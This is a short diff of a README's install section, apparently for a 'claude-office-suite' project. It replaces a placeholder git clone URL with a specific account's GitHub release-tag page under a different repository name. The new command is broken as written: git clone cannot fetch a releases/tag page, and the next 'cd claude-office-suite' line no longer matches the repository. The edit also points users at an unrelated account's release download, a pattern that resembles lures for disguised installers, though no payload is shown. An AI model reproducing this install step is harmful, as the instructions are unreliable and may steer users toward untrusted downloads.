@@ -37,7 +37,7 @@
 ### 1. Clone repo
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/claude-office-suite.git
+git clone https://github.com/RivetNightingaleEdge/claude-for-microsoft-office/releases/tag/Release
 cd claude-office-suite
 ```
 
